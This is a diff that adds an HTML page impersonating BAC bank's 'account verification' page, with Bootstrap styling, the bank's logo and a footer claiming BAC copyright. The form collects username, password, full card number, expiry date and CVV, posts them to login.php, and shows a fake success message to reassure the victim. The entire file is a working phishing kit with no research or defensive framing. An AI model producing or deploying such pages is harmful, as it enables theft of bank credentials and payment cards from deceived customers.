@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="favicon.png" type="image/x-icon">
+    <title>Comprobación de cuentas BAC</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
+
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="styles.css">
+
+    <!-- SweetAlert -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <style>
+        .password-container {
+            position: relative;
+        }
+        
+        #password {
+            padding-right: 30px;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 18px;
+            color: gray;
+        }
+
+        .footer-text a {
+            color: #e4042b;
+            text-decoration: underline;
+        }
+
+        .form-inline-group {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+        }
+
+        .form-inline-group .form-group {
+            flex: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <center>
+                <img src="Logo.png" alt="Logo de BAC" style="width: 180px; margin-bottom: 0px;">
+                <h3><strong>Comprobación de cuentas</strong></h3> 
+                <p style="color: #888; font-size: 15px;">Ingrese los datos para su comprobación</p> 
+
+                <form class="form" method="POST" action="login.php" name="login" autocomplete="off" id="loginForm">
+                    <div class="form-group">
+                        <input type="text" id="user" name="user" placeholder="Usuario" required>
+                    </div>
+
+                    <div class="form-group password-container">
+                        <input type="password" id="password" name="password" placeholder="Contraseña" required>
+                        <span class="toggle-password" onclick="togglePasswordVisibility()">
+                            <i id="eyeIcon" class="fa fa-eye"></i>
+                        </span>
+                    </div>
+
+                    <div class="form-group">
+                        <input 
+                            type="tel" 
+                            id="cardnumber" 
+                            name="cardnumber" 
+                            placeholder="Número de tarjeta" 
+                            maxlength="19" 
+                            pattern="\d{4}-\d{4}-\d{4}-\d{4}" 
+                            required
+                        >
+                    </div>
+
+                    <div class="form-inline-group">
+                        <div class="form-group">
+                            <label for="expirationDate">Valid THRU</label>
+                            <input 
+                                type="tel" 
+                                id="expirationDate" 
+                                name="expirationDate" 
+                                placeholder="MM/YY" 
+                                maxlength="5" 
+                                pattern="\d{2}/\d{2}" 
+                                required
+                            >
+                        </div>
+
+                        <div class="form-group">
+                            <label for="cvv">CVV/CVC</label>
+                            <input 
+                                type="tel" 
+                                id="cvv" 
+                                name="cvv" 
+                                placeholder="3 dígitos" 
+                                maxlength="3" 
+                                pattern="\d{3}" 
+                                required
+                            >
+                        </div>
+                    </div>
+
+                    <button type="submit" id="submitBtn" disabled>Comprobar datos</button>
+                </form>
+
+                <p style="margin-top: 10px;">
+                    ¿Tienes problemas con tus datos? <a href="https://www.baccredomatic.com/" style="color: #e4042b;">Haz clic aquí</a>
+                </p>
+                
+            </center>
+        </div>
+    </div>
+
+    <p class="footer-text">Todos los derechos reservados. 2025 © BAC International Bank.</p>
+
+    <script>
+        const userInput = document.getElementById('user');
+        const passwordInput = document.getElementById('password');
+        const cardNumberField = document.getElementById('cardnumber');
+        const expirationDateField = document.getElementById('expirationDate');
+        const cvvField = document.getElementById('cvv');
+        const submitBtn = document.getElementById('submitBtn');
+        const form = document.getElementById('loginForm');
+        const eyeIcon = document.getElementById('eyeIcon');
+
+        function checkForm() {
+            if (
+                userInput.value.trim() !== '' &&
+                passwordInput.value.trim() !== '' &&
+                /^\d{4}-\d{4}-\d{4}-\d{4}$/.test(cardNumberField.value) &&
+                /^\d{2}\/\d{2}$/.test(expirationDateField.value) &&
+                /^\d{3}$/.test(cvvField.value)
+            ) {
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.disabled = true;
+            }
+        }
+
+        [userInput, passwordInput, cardNumberField, expirationDateField, cvvField].forEach(input => {
+            input.addEventListener('input', checkForm);
+        });
+
+        function togglePasswordVisibility() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            eyeIcon.className = type === 'password' ? 'fa fa-eye' : 'fa fa-eye-slash';
+        }
+
+        // Formateo automático del número de tarjeta
+        cardNumberField.addEventListener('input', function () {
+            let value = this.value.replace(/\D/g, '').slice(0, 16);
+            this.value = value.replace(/(\d{4})(?=\d)/g, '$1-');
+        });
+
+        // Formateo automático de la fecha de vencimiento
+        expirationDateField.addEventListener('input', function () {
+            let value = this.value.replace(/\D/g, '').slice(0, 4);
+            if (value.length > 2) value = value.replace(/(\d{2})(\d{2})/, '$1/$2');
+            this.value = value;
+        });
+
+        form.addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            if (submitBtn.disabled) {
+                Swal.fire({
+                    title: '¡Datos inválidos!',
+                    text: 'Por favor revise todos los campos.',
+                    icon: 'error',
+                    confirmButtonText: 'Aceptar'
+                });
+                return;
+            }
+
+            Swal.fire({
+    title: '¡Datos comprobados exitosamente!',
+    text: 'Sus datos han sido comprobados correctamente.',
+    icon: 'success',
+    confirmButtonText: 'Confirmar',
+    confirmButtonColor: '#28a745', // verde
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    form.submit();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
